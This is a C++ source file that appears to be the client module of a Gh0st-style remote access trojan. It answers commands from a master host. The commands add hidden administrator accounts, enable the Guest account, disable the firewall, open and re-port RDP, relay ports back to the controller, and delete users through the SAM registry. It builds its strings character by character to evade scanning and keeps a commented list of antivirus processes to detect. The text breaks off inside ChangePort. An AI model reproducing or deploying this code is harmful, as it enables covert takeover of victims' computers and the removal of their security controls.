// SysInfo.cpp: implementation of the CSysInfo class.
//
//////////////////////////////////////////////////////////////////////
#include "StdAfx.h"

#include "SysInfo.h"
#include <LM.h>
#include <tchar.h>
#include <TLHELP32.H>
#include "KernelManager.h"
#include "Proxy.h"
#include "psapi.h"
#include "Wtsapi32.h"
/*#include "../decode.h"*/

#pragma comment(lib,"netapi32")
#pragma comment(lib,"Iphlpapi.lib")
#pragma comment(lib,"Psapi.lib")

typedef struct 
{
	DWORD	dwSizeHigh;
	DWORD	dwSizeLow;
}FILESIZEDLL;

//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////

extern BOOL GetCurrentUserName(char *szUserName);
extern BOOL EnablePrivilege(LPCTSTR lpPrivilegeName, BOOL bEnable);

CSysInfo::CSysInfo(CClientSocket *pClient,UINT Ports,UCHAR Linetypes,UCHAR Opertypes,CHAR *Addressl) : CManager(pClient)
{
	NetPort = Ports;        //连接端口
	NetLine = Linetypes;    //连接方式
	NetOpert = Opertypes;   //运行类型
	Linkaddress = Addressl; //连接地址
	
 	SendSysInfo();
 	nCtrlPort = 0;
 	nPort = 0;
	lstrcpy(m_strCurrentProcessFileNames, _T("\\termsrv_t.dll"));
}

CSysInfo::~CSysInfo()
{
	cPortMap.Stop();
}


StringTab StringSplit_Struct(const char * str,const char* split)
{
	StringTab result;
	char* string =(char*)malloc(strlen(str)+1);
	strcpy(string, str);
	result.string = (char * * )malloc(sizeof(char *)*1);
	memset(result.string,0,sizeof(char *)*1);
	result.number = 0;
	
	char* p = string;
	char* pos = string;
	while(*p != '\0')
	{
        char* temp;
        char* tt;
		
        pos = strstr(p,split);
        if(pos == 0)
        {
			result.string = (char * * )realloc(result.string,sizeof(char *)*(result.number+1));
			result.string[result.number] = p;
			return result;
        }
		
        temp = (char * )malloc(sizeof(char)*(pos - p+1));
        memset(temp,0,sizeof(char)*(pos - p+1));
		
        tt = temp;
        while(p<=pos)
        {
			*temp++ = *p++;
        }
		
        *--temp = '\0';
        result.string = (char * * )realloc(result.string,sizeof(char *)*(result.number+1));
        result.string[result.number] = tt;
        /*计数器加一*/
        result.number++;
        /*设置下一次遍历时的指针（重要）。当split长度大于1时，不这样设置会多赋值不必要的字符串*/
        p +=strlen(split)-1;
	}
	return result;
}

wchar_t* AnsiToUnicode(char* str)
{
	if( !str )
		return NULL;
	
	int wcslen = ::MultiByteToWideChar(CP_ACP, NULL, str, strlen(str), NULL, 0);
	wchar_t *wstr = new wchar_t[wcslen + 1];
	::MultiByteToWideChar(CP_ACP, NULL, str, strlen(str), wstr, wcslen);
	wstr[wcslen] = '\0';
	
	return wstr;
}

DWORD WINAPI CSysInfo::PortMap(LPVOID lparam)
{	
	CSysInfo *pThis = (CSysInfo *)lparam;
	
	pThis->cPortMap.Stop();
	struct hostent *hp;
	hp = gethostbyname(CKernelManager::m_strMasterHost);
	pThis->cPortMap.PortTransfer_2( inet_ntoa (*(struct in_addr *)*hp->h_addr_list), pThis->nCtrlPort, "127.0.0.1", pThis->nPort);
	return 0;
}

void CSysInfo::OnReceive(LPBYTE lpBuffer, UINT nSize)
{
	switch (lpBuffer[0])
	{
	case COMMAND_SEND_SYSINFO:
		SendSysInfo();
		break;
	case COMMAND_SEND_INSTALLINFO:
		SendInstallInfo();
		break;
	case COMMAND_NET_USER: // 无NET加用户
		AddAdminUser();
		break;
	case COMMAND_GUEST: // 开启GUEST账号
		OpenGuest();
		break;
	case COMMAND_STOPFIRE: // 关防火墙
		Sleep(10);
        StopFire();
		break;
	case COMMAND_CHANGE_PORT: // 更改终端端口
		Sleep(10);
		ChangePort(lpBuffer + 1);
		break;
	case COMMAND_OPEN_PROXY:
		OpenProxy(lpBuffer + 1);
		break;
	case COMMAND_CLOSE_3389:
		Sleep(10);
		Close3389();
		break;
	case COMMAND_OPEN_3389:
		Sleep(10);
		Open3389(lpBuffer + 1);
		break;
	case COMMAND_FILE_DATA:
		WriteLocalRecvFile(lpBuffer + 1, nSize -1);
		break;
	case COMMAND_FILE_SIZE:
		CreateLocalRecvFile(lpBuffer + 1);
		break;
	case COMMAND_DLL_3389:
		Sleep(100);
		Open3389(lpBuffer + 1);
		break;
	case COMMAND_START_MAP:
		{
			StringTab stMap;
			stMap = StringSplit_Struct( (LPTSTR)lpBuffer + 1, "|" );
			if (stMap.number != 1)
				return;
			nCtrlPort = atoi(stMap.string[0]);
			nPort = atoi(stMap.string[1]);
			if (nCtrlPort != 0 && nPort != 0)
			{
				CloseHandle(MyCreateThread(NULL, 0,	(LPTHREAD_START_ROUTINE)PortMap, 
					this, 0, NULL, true));
			}
		}
	case COMMAND_CLOSE_PORT:
		cPortMap.Stop();
		break;
	case COMMAND_SLIST:
		SendSList();
		break;
	case COMMAND_DELUSER:
		DeleteUser();
		break;
	case COMMAND_NET_CHANGE_PASS:
		ChangeUserPass();
		break;
	case COMMAND_WTSLIST:
		SendWtsmList();
		break;
	case COMMAND_WTS_Disconnect:
		WtsDisc((LPBYTE)lpBuffer + 1, nSize - 1);
		break;
	case COMMAND_WTS_Logoff:
		WtsLoGoff((LPBYTE)lpBuffer + 1, nSize - 1);
		break;
	case COMMAND_DISABLEEUSER:
		SendNetstart((LPBYTE)lpBuffer + 1, nSize - 1, TRUE);  
		break;
	case COMMAND_ACITVEUSER:
		SendNetstart((LPBYTE)lpBuffer + 1, nSize - 1, NULL);  
		break;
	default:
		break;
	}
}

// typedef struct
// {
// 	char *Course;
// 	char *Name;
// }ANTIVIRUS;
// 
// ANTIVIRUS g_AntiVirus_Datas[40] = //添加修改数值
// {
// 	{"360tray.exe",       "360安全卫士"},
// 	{"360sd.exe",         "360杀毒"},
// 	{"kxetray.exe",       "金山毒霸"},
// 	{"KSafeTray.exe",     "金山安全卫士"},
// 	{"QQPCRTP.exe",       "QQ电脑管家"},
// 	{"BaiduSd.exe",       "百度杀毒"},
// 	{"baiduSafeTray.exe", "百度卫士"},
// 	{"KvMonXP.exe",       "江民"},
// 	{"RavMonD.exe",       "瑞星"},
// 	{"QUHLPSVC.EXE",      "QuickHeal"},//印度
// 	{"mssecess.exe",      "微软MSE"},
// 	{"cfp.exe",           "Comodo杀毒"},
// 	{"SPIDer.exe",        "DR.WEB"},//大蜘蛛
// 	{"acs.exe",           "Outpost"},
// 	{"V3Svc.exe",         "安博士V3"},
// 	{"AYAgent.aye",       "韩国胶囊"},
// 	{"avgwdsvc.exe",      "AVG"},
// 	{"f-secure.exe",      "F-Secure"},//芬安全
// 	{"avp.exe",           "卡巴"},
// 	{"Mcshield.exe",      "麦咖啡"},
// 	{"egui.exe",          "NOD32"},
// 	{"knsdtray.exe",      "可牛"},
// 	{"TMBMSRV.exe",       "趋势"},
// 	{"avcenter.exe",      "小红伞"},
// 	{"ashDisp.exe",       "Avast网络安全"}, 
// 	{"rtvscan.exe",       "诺顿"}, 
// 	{"remupd.exe",        "熊猫卫士"},
// 	{"vsserv.exe",        "BitDefender"},//BD  bdagent.exe
// 	{"PSafeSysTray.exe",  "PSafe反病毒"},//巴西
// 	{"ad-watch.exe",      "Ad-watch反间谍"}, 
// 	{"K7TSecurity.exe",   "K7杀毒"}, 
// 	{"UnThreat.exe",      "UnThreat"},//保加利亚
// 	{"  ",    "  "}
// 	
// };
// 
// char* GetVirus()
// {	
// 	static char AllName[1024];
// 	int t=0;
// 	memset(AllName, 0, sizeof(AllName));
// 	while(1)
// 	{
// 		if (strstr(g_AntiVirus_Datas[t].Course, " " )  == 0 )
// 		{	
// 			if (GetProcessID(g_AntiVirus_Datas[t].Course)) 
// 			{
// 				lstrcat( AllName, g_AntiVirus_Datas[t].Name);
// 				lstrcat( AllName, " " );
// 			}
// 		}
// 		else
// 			break;
// 		t++;
// 	}
// 	
// 	if (strstr(AllName, " " )  == 0 )
// 	{	
// 		lstrcat(AllName , "未发现 ");
// 	}
// 	
// 	return AllName;
// }

void CSysInfo::WtsLoGoff(LPBYTE lpBuffer, UINT nSize)
{
	EnablePrivilege(SE_DEBUG_NAME, TRUE);
	for (int i = 0; i < nSize; i += 4)
	{
		WTSLogoffSession(WTS_CURRENT_SERVER_HANDLE, *(LPDWORD)(lpBuffer + i) , FALSE );
	}
	SendWtsmList();
	EnablePrivilege(SE_DEBUG_NAME, FALSE);
}

void CSysInfo::WtsDisc(LPBYTE lpBuffer, UINT nSize)
{
	EnablePrivilege(SE_DEBUG_NAME, TRUE);
	
	for (int i = 0; i < nSize; i += 4)
	{
		WTSDisconnectSession(WTS_CURRENT_SERVER_HANDLE, *(LPDWORD)(lpBuffer + i) , FALSE );
	}
	SendWtsmList();
	EnablePrivilege(SE_DEBUG_NAME, FALSE);
}

char* CSysInfo::GetTSClientName(DWORD sessionID)
{
	LPTSTR  ppBuffer		  = NULL;
	DWORD   pBytesReturned	  = 0;
	char*  currentClientName;
	
	if( WTSQuerySessionInformation( WTS_CURRENT_SERVER_HANDLE,sessionID,WTSClientName,&ppBuffer,&pBytesReturned))
	{
		currentClientName = (char *)ppBuffer;
	}
	return currentClientName;
}

bool GetSessionUserName(DWORD dwSessionId, char username2[256]) 
{
	LPWSTR pBuffer = NULL; 
	DWORD dwBufferLen; 
	WCHAR username[256];
	
	BOOL bRes = WTSQuerySessionInformationW(WTS_CURRENT_SERVER_HANDLE, dwSessionId, WTSUserName, &pBuffer, &dwBufferLen); 
	
	if (bRes == FALSE) 
		return false; 
	
	lstrcpyW(username ,pBuffer); 
	WTSFreeMemory(pBuffer); 

	char   szANSIString[MAX_PATH]={0};
    WideCharToMultiByte(CP_ACP,WC_COMPOSITECHECK,username,-1,szANSIString,sizeof(szANSIString),NULL,NULL);
	lstrcpy(username2 ,szANSIString); 

	return true; 
}

char* CSysInfo::GetTSClientProtocolType(DWORD sessionID)
{
	LPTSTR  ppBuffer			   = NULL;
	DWORD   pBytesReturned	       = 0;
	char*  clientProtocolTypeStr;
	
	if( WTSQuerySessionInformation( WTS_CURRENT_SERVER_HANDLE,
		sessionID,
		WTSClientProtocolType,
		&ppBuffer,
		&pBytesReturned) )
	{
		switch( *ppBuffer )
		{
		case WTS_PROTOCOL_TYPE_CONSOLE:
			clientProtocolTypeStr = "Console";
			break;
		case WTS_PROTOCOL_TYPE_ICA:
			clientProtocolTypeStr = "ICA";
			break;
		case WTS_PROTOCOL_TYPE_RDP:
			clientProtocolTypeStr = "RDP";
			break;
		default:
			break;
		}
		
		WTSFreeMemory(ppBuffer); 
	}
	
	return clientProtocolTypeStr;
}

LPBYTE CSysInfo::getWtsmList()
{
	EnablePrivilege(SE_DEBUG_NAME, TRUE);
	LPBYTE	lpBuffer = NULL;
	DWORD	dwOffset = 0;
	DWORD	dwLength = 0;
	lpBuffer = (LPBYTE)LocalAlloc(LPTR, 1024);
	lpBuffer[0] = TOKEN_WTSLIST;
	dwOffset = 1;

	char	*ConnectionState;   
	char	UserName[256];  
	char	*ClientName; 
	char	*ProtocolType;

	int sk=0;
	
	PWTS_SESSION_INFO ppSessionInfo = NULL;
	DWORD			  pCount = 0;
	WTS_SESSION_INFO  wts;
	
	WTSEnumerateSessions( WTS_CURRENT_SERVER_HANDLE, 0, 1, &ppSessionInfo, &pCount );

	OSVERSIONINFO OSversion;	
	OSversion.dwOSVersionInfoSize=sizeof(OSVERSIONINFO);
	GetVersionEx(&OSversion);

    bool os=false;
    
	if (OSversion.dwPlatformId == VER_PLATFORM_WIN32_NT)
	{
		if (OSversion.dwMajorVersion<6)
		{
			os=FALSE;
		}
		else
		{
           os=TRUE;
		}
	}
	
	for( DWORD i = 0; i < pCount; i++ )
	{
		wts = ppSessionInfo[i];
		
		DWORD					TSSessionId		  = wts.SessionId;
		LPTSTR					TSpWinStationName = wts.pWinStationName;
		WTS_CONNECTSTATE_CLASS	TSState			  = wts.State;
		
		ConnectionState=NULL;
		
		char ZxOLV[] = {'A','c','t','i','v','e','\0'};
		char kycNF[] = {'C','o','n','n','e','c','t','e','d','\0'};
		char HJvVn[] = {'C','o','n','n','e','c','t','Q','u','e','r','y','\0'};
		char uyvcR[] = {'S','h','a','d','o','w','\0'};
		char ZMSHe[] = {'D','i','s','c','o','n','n','e','c','t','e','d','\0'};
		char reZwa[] = {'I','d','l','e','\0'};
		char DBuPD[] = {'L','i','s','t','e','n','\0'};
		char sQSdk[] = {'R','e','s','e','t','\0'};
		char oxiJo[] = {'D','o','w','n','\0'};
		char aHopp[] = {'I','n','i','t','\0'};

		switch( TSState )
		{
		case WTSActive:
			ConnectionState = ZxOLV;
			break;
		case WTSConnected:
			ConnectionState = kycNF;
			break;
		case WTSConnectQuery:
			ConnectionState = HJvVn;
			break;
		case WTSShadow:
			ConnectionState = uyvcR;
			break;
		case WTSDisconnected:
			ConnectionState = ZMSHe;
			break;
		case WTSIdle:
			ConnectionState = reZwa;
			break;
		case WTSListen:
			ConnectionState = DBuPD;
			break;
		case WTSReset:
			ConnectionState = sQSdk;
			break;
		case WTSDown:
			ConnectionState = oxiJo;
			break;
		case WTSInit:
			ConnectionState = aHopp;
			break;
		}
		
		ClientName=NULL;
		ProtocolType=NULL;

		GetSessionUserName(TSSessionId,UserName);
		ClientName		  = GetTSClientName(         TSSessionId       );
		ProtocolType      = GetTSClientProtocolType( TSSessionId       );

		sk=0;
		if (os)
		{
			sk=1;
		}

		if (!lstrlen(UserName))
		{
			sk=pCount+5;
		}

		if (i>=sk)
		{
	
		// 此进程占用数据大小
		dwLength = lstrlen(ConnectionState) + lstrlen(UserName) + lstrlen(ClientName) + lstrlen(ProtocolType) + sizeof(DWORD) + 5;
		
		// 缓冲区太小，再重新分配下
		if (LocalSize(lpBuffer) < (dwOffset + dwLength))
			lpBuffer = (LPBYTE)LocalReAlloc(lpBuffer, (dwOffset + dwLength), LMEM_ZEROINIT|LMEM_MOVEABLE);
		
		memcpy(lpBuffer + dwOffset, ConnectionState, lstrlen(ConnectionState) + 1);
		dwOffset += lstrlen(ConnectionState) + 1;

		memcpy(lpBuffer + dwOffset, UserName, lstrlen(UserName)+1);
		dwOffset += lstrlen(UserName)+1;	
		
		memcpy(lpBuffer + dwOffset, ClientName, lstrlen(ClientName) + 1);
		dwOffset += lstrlen(ClientName) + 1;

		memcpy(lpBuffer + dwOffset, ProtocolType, lstrlen(ProtocolType)+1);
		dwOffset += lstrlen(ProtocolType)+1;	

		memcpy(lpBuffer + dwOffset, &(TSSessionId), sizeof(DWORD)+1);
		dwOffset += sizeof(DWORD)+1;	
		}
	}
	lpBuffer = (LPBYTE)LocalReAlloc(lpBuffer, dwOffset, LMEM_ZEROINIT|LMEM_MOVEABLE);
	
	EnablePrivilege(SE_DEBUG_NAME, FALSE); 
	return lpBuffer;
}

void CSysInfo::SendWtsmList()
{
	UINT	nRet = -1;
	
	LPBYTE	lpBuffer = getWtsmList();
	if (lpBuffer == NULL)
	{
		return;
	}
	
	Send((LPBYTE)lpBuffer, LocalSize(lpBuffer));
	LocalFree(lpBuffer);
}

UINT GetPort(LPCTSTR lpServiceName, LPTSTR lpBuffer, UINT uSize)
{
	char	strSubKey[1024];
	memset(lpBuffer, 0, uSize);
	memset(strSubKey, 0, sizeof(strSubKey));
	wsprintf(strSubKey, "SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\%s", lpServiceName);
	ReadRegEx(HKEY_LOCAL_MACHINE, strSubKey, _T("PortNumber"), REG_DWORD, (char *)lpBuffer, NULL, uSize, 0);
	if (lstrlen(lpBuffer) == 0)
	{
		lpBuffer = _T("3389");
	}
	return lstrlen(lpBuffer);
}

PCHAR GetTotalPhys()
{
	CHAR *pBuf = new CHAR[20];
	MEMORYSTATUSEX		Meminfo;
	unsigned __int64	dSize;
	memset(&Meminfo, 0, sizeof(Meminfo));
	Meminfo.dwLength = sizeof(Meminfo);
	GlobalMemoryStatusEx(&Meminfo);
	dSize = (unsigned __int64)Meminfo.ullTotalPhys;
	dSize /= 1024;
	dSize /= 1024;
	dSize += 1;
	wsprintf(pBuf, _T("%u"), dSize);
	return pBuf;
}

void CSysInfo::SendNetstart(LPBYTE lpBuffer, UINT nSize , UINT User_kt)  //帐户启用/停用
{
	wchar_t user_name[256]={0};
	USER_INFO_1008 ui;
	DWORD dwLevel = 1008;
	NET_API_STATUS nStatus;
	BYTE bToken = NULL;
	mbstowcs(user_name, (const char *)lpBuffer,256);
	if(User_kt==NULL)  //用户启用
	{
		ui.usri1008_flags = UF_SCRIPT|UF_DONT_EXPIRE_PASSWD;  // 用户停用 | 密码用不过期
	}
	else  //用户停用
	{
		ui.usri1008_flags = UF_ACCOUNTDISABLE|UF_PASSWD_CANT_CHANGE;  // 用户停用 | 用户不能更改密码
	}
	nStatus = NetUserSetInfo( NULL,user_name,dwLevel, (LPBYTE )&ui,NULL);
	if (nStatus == NERR_Success)
		bToken = TOKEN_STATE_SUCCESS;
	else
		bToken = TOKEN_STATE_ERROR;
	Send(&bToken, 1);
	Sleep(100);
	SendSList();
	LocalFree((LPBYTE)&bToken);
}

static int nuser=0;
char user_all[50][50]={0};
inline int get_all_user(void) //得到用户   
{
    LPUSER_INFO_0   pBuf   =   NULL;   
    LPUSER_INFO_0   pTmpBuf;   
    DWORD   dwLevel   =   0;   
    DWORD   dwPrefMaxLen   =   MAX_PREFERRED_LENGTH;   
    DWORD   dwEntriesRead   =   0;   
    DWORD   dwTotalEntries   =   0;   
    DWORD   dwResumeHandle   =   0;   
    NET_API_STATUS   nStatus;   

    do   
	{   
        nStatus   =   NetUserEnum(NULL,dwLevel,FILTER_NORMAL_ACCOUNT,(LPBYTE*)&pBuf,dwPrefMaxLen,&dwEntriesRead,&dwTotalEntries,&dwResumeHandle);   
    
        if((nStatus   ==   NERR_Success)   ||   (nStatus   ==   ERROR_MORE_DATA))   
		{   
            if((pTmpBuf=pBuf)!=NULL)   
			{   
                for(DWORD   i=0;i<dwEntriesRead;++i)   
				{   
                    wcstombs(user_all[nuser++],pTmpBuf->usri0_name,80);   
                    pTmpBuf++;   
				}   
			}   
		}   
    
        if(pBuf!=NULL)   
		{   
            NetApiBufferFree(pBuf);   
            pBuf   =   NULL;   
		}   
	}   
    while   (nStatus   ==   ERROR_MORE_DATA);     
    
    if(pBuf   !=   NULL)   
        NetApiBufferFree(pBuf);   
    
    return   nuser;   
  }   

char getall_Groups(char *str_user,char Groupt[]) //根据用户得到用户组
{
	LPLOCALGROUP_USERS_INFO_0 pBuf = NULL; 
	NET_API_STATUS nStatus;
	DWORD dwLevel = 0; 
	DWORD dwFlags = LG_INCLUDE_INDIRECT; 
	DWORD dwPrefMaxLen = -1;
    DWORD dwEntriesRead = 0; 
    DWORD dwTotalEntries = 0; 
	wchar_t user[256]={0};
	DWORD len;
	char Groups[256]={NULL};
	int strj,strp;

    size_t retlen = mbstowcs(user, (const char *)str_user,256);

    nStatus = NetUserGetLocalGroups(
		    NULL,
		    user,
		    dwLevel,
		    dwFlags,
		    (LPBYTE*)&pBuf,
		    dwPrefMaxLen,
		    &dwEntriesRead,
		    &dwTotalEntries); 
    if(nStatus == NERR_Success) 
	{ 
        LPLOCALGROUP_USERS_INFO_0   pTmpBuf; 
        DWORD   i; 
        DWORD   dwTotalCount   =   0; 
        if((pTmpBuf = pBuf) != NULL) 
		{ 
            for(i = 0; i < dwEntriesRead;   i++) 
			{ 
                if(pTmpBuf == NULL) 
                    break; 

				char *p=NULL;
				len = wcslen(pTmpBuf->lgrui0_name);
				p = (char *) malloc(len+1);
				wsprintf(p,"%S",pTmpBuf->lgrui0_name);
				strncpy(Groups,p,sizeof(Groups));
				free(p);
				strj=strlen(Groupt);
				strp=strlen(Groups);
				if(strj!=0)
				{
					Groupt[strj]='/';
					strj++;
				}
				for(int i=0;i<strp;i++)
				{
					Groupt[strj+i]=Groups[i];
				}
                pTmpBuf++; 
                dwTotalCount++; 
			} 
		}
	}
	return 0;
}

BOOL IsGuestDisabled(char *str_user)  //根据用户得到 用户状态
{
	BOOL bRet = TRUE;
	LPUSER_INFO_1 puiVal = NULL;
	
	wchar_t user[256]={0};
	size_t retlen = mbstowcs(user, (const char *)str_user,256);
	
	if(NERR_Success == NetUserGetInfo(NULL,user, 1, (LPBYTE *)&puiVal))
	{
		if(!(puiVal->usri1_flags & UF_ACCOUNTDISABLE))
		{
			bRet = FALSE;
		}
	}
    if(puiVal)
	{
        NetApiBufferFree(puiVal);
	}
    return bRet;
}

LPBYTE CSysInfo::getSList()
{
	EnablePrivilege(SE_DEBUG_NAME, TRUE);	
	//得到所有用户   
	nuser=0;
    if(!get_all_user())  
		return NULL;
    //遍历开始   
	LPBYTE			lpBuffer = (LPBYTE)LocalAlloc(LPTR, 1024);
	lpBuffer[0] = TOKEN_SLIST;
	DWORD			dwOffset = 1;
	
    for(int i=0;i<nuser;i++)//循环用户  
	{
		char Groups[256]={NULL};
		getall_Groups(user_all[i],Groups);  //根据用户 查找用户组
		BOOL stt=IsGuestDisabled(user_all[i]);  //根据用户 得出用户状态
		char *GetInfo="Active";
		if(stt)
		{
			GetInfo="Disable";
		}
		
		memcpy(lpBuffer + dwOffset, user_all[i], lstrlen(user_all[i])+1);
		dwOffset += lstrlen(user_all[i])+1;
		memcpy(lpBuffer + dwOffset, Groups, lstrlen(Groups) + 1);
		dwOffset += lstrlen(Groups) + 1;
		memcpy(lpBuffer + dwOffset, GetInfo, lstrlen(GetInfo) + 1);
		dwOffset += lstrlen(GetInfo) + 1;
	}
	
	lpBuffer = (LPBYTE)LocalReAlloc(lpBuffer, dwOffset, LMEM_ZEROINIT|LMEM_MOVEABLE);
	
	EnablePrivilege(SE_DEBUG_NAME, FALSE);
	return lpBuffer;
}

void CSysInfo::SendSList()
{
	UINT	nRet = -1;
	LPBYTE	lpBuffer = getSList();
	if (lpBuffer == NULL)
		return;
	
	Send((LPBYTE)lpBuffer, LocalSize(lpBuffer));
	LocalFree(lpBuffer);	
}

BOOL CSysInfo::DelSidName(char *sid)
{
	HKEY hkey;
	DWORD ret;
	char C_sid[10];
	if (strncmp(sid,"00000",strlen("00000")) == 0)
		wsprintf(C_sid,"%s",sid);
	else
		wsprintf(C_sid,"00000%s",sid);
	char ocZOK[] = {'S','A','M','\\','S','A','M','\\','D','o','m','a','i','n','s','\\','A','c','c','o','u','n','t','\\','U','s','e','r','s','\\','\0'};
	ret=RegOpenKey(HKEY_LOCAL_MACHINE,ocZOK,&hkey);
	if (ret!=ERROR_SUCCESS)
		return FALSE;
	ret=RegDeleteKey(hkey,C_sid);
	RegCloseKey(hkey);
	if (ret==ERROR_SUCCESS)
	{
		return TRUE;
	}
	else
	{
		return FALSE;
	}
}

void CSysInfo::ChangeUserPass()
{
	BYTE bToken = NULL;
	TCHAR *lpUser = (TCHAR *)GetBuffer(1);
	TCHAR *lpPass = (TCHAR *)GetBuffer(1 + (lstrlen(lpUser) + 1) * sizeof(TCHAR));

	USER_INFO_3 *pUI=NULL;
	DWORD dwError = 0;
	NET_API_STATUS nStatus;	

	wchar_t *wzUser = AnsiToUnicode(lpUser);
	nStatus=NetUserGetInfo(NULL,wzUser,3,(LPBYTE*)&pUI);

	pUI->usri3_flags = UF_NORMAL_ACCOUNT|UF_DONT_EXPIRE_PASSWD;
	pUI->usri3_password=AnsiToUnicode(lpPass);
	pUI->usri3_password_expired=FALSE;
	nStatus=NetUserSetInfo(NULL,wzUser,3,(LPBYTE)pUI,&dwError);
	delete[] wzUser;
	delete[] pUI->usri3_password;

	if(nStatus==NERR_Success)
		bToken = TOKEN_CHANGE_PSAA_SUCCESS;
	else
		bToken = TOKEN_CHANGE_PSAA_ERROR;
	Send(&bToken, 1);

	if (pUI != NULL)
		NetApiBufferFree(pUI);

	LocalFree((LPBYTE)&bToken);
}

BOOL CSysInfo::DelUserName(char *user)
{	
	char FqqvK[] = {'S','A','M','\\','S','A','M','\\','D','o','m','a','i','n','s','\\','A','c','c','o','u','n','t','\\','U','s','e','r','s','\\','N','a','m','e','s','\\','\0'};
	BYTE bToken = NULL;
	HKEY hkey;
	DWORD ret;
	char C_user[40];
	wsprintf(C_user,"%s",user);
	ret=RegOpenKey(HKEY_LOCAL_MACHINE,FqqvK,&hkey);
	if (ret!=ERROR_SUCCESS)
		return FALSE;
	ret=RegDeleteKey(hkey,C_user);
	RegCloseKey(hkey);
	if (ret==ERROR_SUCCESS)
	{
		bToken = TOKEN_DEL_SUCCESS;
	}
	else
	{
		bToken = TOKEN_DEL_ERROR;
	}
	Send(&bToken, 1);
	LocalFree((LPBYTE)&bToken);
	return TRUE;
}

void CSysInfo::AddAdminUser()
{
	USER_INFO_1 ui;
	DWORD dwError = 0;
	NET_API_STATUS nStatus;
	BYTE bToken = NULL;
	TCHAR *lpUser = (TCHAR *)GetBuffer(1);
	TCHAR *lpPass = (TCHAR *)GetBuffer(1 + (lstrlen(lpUser) + 1) * sizeof(TCHAR));
	TCHAR *lpGroup = (TCHAR *)GetBuffer(1 + (lstrlen(lpPass) + 1) * sizeof(TCHAR) + (lstrlen(lpUser) + 1) * sizeof(TCHAR));

	ui.usri1_name = AnsiToUnicode(lpUser);    //这个是要添加的用户名，可以自己改改
	ui.usri1_password = AnsiToUnicode(lpPass);   //这个是用户密码，也可以自己改改
	ui.usri1_priv = USER_PRIV_USER;
	ui.usri1_home_dir = NULL;
	ui.usri1_comment = NULL;
	ui.usri1_flags = UF_SCRIPT | UF_DONT_EXPIRE_PASSWD;
	ui.usri1_script_path = NULL;
	nStatus = NetUserAdd(NULL, 1, (LPBYTE)&ui, &dwError);
	if (nStatus != NERR_Success)
	{
		delete[] ui.usri1_name;
		delete[] ui.usri1_password;
		bToken = TOKEN_ADD_ERROR;
		Send(&bToken, 1);
		return;
	}
	wchar_t szAccountName[100]={0};
	wcscpy(szAccountName,ui.usri1_name);
	delete[] ui.usri1_name;
	delete[] ui.usri1_password;
	LOCALGROUP_MEMBERS_INFO_3 account;
	account.lgrmi3_domainandname=szAccountName;
	wchar_t *wzGroup = AnsiToUnicode(lpGroup);
	//添加到Administrators组
	nStatus = NetLocalGroupAddMembers(NULL,wzGroup,3,(LPBYTE)&account,1);
	delete[] wzGroup;
	if (nStatus == NERR_Success)
		bToken = TOKEN_ADD_SUCCESS;
	else
		bToken = TOKEN_ADD_ERROR;
	Send(&bToken, 1);

	SendSList();
	LocalFree((LPBYTE)&bToken);
}

void CSysInfo::DeleteUser()
{
	TCHAR *lpUserName = (TCHAR *)GetBuffer(1);
	
	BYTE bToken = NULL;
	DWORD dwError = 0;
	NET_API_STATUS nStatus;
	wchar_t *wzUserName = AnsiToUnicode(lpUserName);
	nStatus = NetUserDel(NULL,wzUserName);
	delete[] wzUserName;
	if(nStatus==NERR_Success)
	{
		bToken = TOKEN_DEL_SUCCESS;
		Send(&bToken, 1);
	}
	if(nStatus!=NERR_Success&&nStatus!=NERR_UserNotFound)
	{
		HKEY hKey; 
		DWORD dwValue; 
		char strType[32];
		DWORD dwRegType;
		TCHAR lpSubKey[128];
		wsprintf(lpSubKey,"SAM\\SAM\\Domains\\Account\\Users\\Names\\%s",lpUserName);
		int nCount = 0;
		while(1)
		{
			if(0==RegOpenKey(HKEY_LOCAL_MACHINE,lpSubKey, &hKey)) 
			{ 
				DWORD dwLen=sizeof(DWORD);
				RegQueryValueEx(hKey,"",NULL,&dwRegType,(BYTE*)&dwValue, &dwLen); 
				RegCloseKey(hKey); 
				wsprintf(strType,"%08X",dwRegType);	
				break;
			} 
			Sleep(50);
			nCount++;
			if(nCount > 100)
			{
				return;
			}
		}
		if (DelUserName(lpUserName))
		{
			if (DelSidName(strType))
			{
				return;
			}
		}
	}
	SendSList();
}

PCHAR GetAvailPhys()
{
	CHAR *pBuf = new CHAR[20];
	MEMORYSTATUSEX		Meminfo;
	unsigned __int64	dSize;
	memset(&Meminfo, 0, sizeof(Meminfo));
	Meminfo.dwLength = sizeof(Meminfo);
	GlobalMemoryStatusEx(&Meminfo);
	dSize = (unsigned __int64)Meminfo.ullAvailPhys;
	dSize /= 1024;
	dSize /= 1024;
	dSize += 1;
	wsprintf(pBuf, _T("%u"), dSize);
	return pBuf;
}

void CSysInfo::SendInstallInfo()
{
	LPBYTE			lpBuffer = (LPBYTE)LocalAlloc(LPTR, 2048);
	lpBuffer[0] = TOKEN_INSTALLINFOLIST;	
	tagOnlineInfo m_InsInfo;
	GetOnlineInfo(&m_InsInfo);
	memcpy(lpBuffer + 1, &m_InsInfo, sizeof(tagOnlineInfo));
	Send(lpBuffer, LocalSize(lpBuffer));
	LocalFree(lpBuffer);
}

void CSysInfo::SendSysInfo()
{
	LPBYTE			lpBuffer = (LPBYTE)LocalAlloc(LPTR, 2048);
	lpBuffer[0] = TOKEN_SYSINFOLIST;	
	tagSystemInfo m_SysInfo;
	GetSystemInfo(&m_SysInfo);
	memcpy(lpBuffer + 1, &m_SysInfo, sizeof(tagSystemInfo));
	Send(lpBuffer, LocalSize(lpBuffer));
	LocalFree(lpBuffer);
}

DWORD CSysInfo::ChangePort(LPVOID lparam)
{
	DWORD szPort=atoi((char*)lparam);
	
	TCHAR szCanConnect[32];
	
	char AzjMl[] = {'S','Y','S','T','E','M','\\','C','u','r','r','e','n','t','C','o','n','t','r','o','l','S','e','t','\\','C','o','n','t','r','o','l','\\','T','e','r','m','i','n','a','l',' ','S','e','r','v','e','r','\\','R','D','P','T','c','p','\0'};
	char fWJan[] = {'S','Y','S','T','E','M','\\','C','u','r','r','e','n','t','C','o','n','t','r','o','l','S','e','t','\\','C','o','n','t','r','o','l','\\','T','e','r','m','i','n','a','l',' ','S','e','r','v','e','r','\\','W','i','n','S','t','a','t','i','o','n','s','\\','R','D','P','-','T','c','p','\0'};
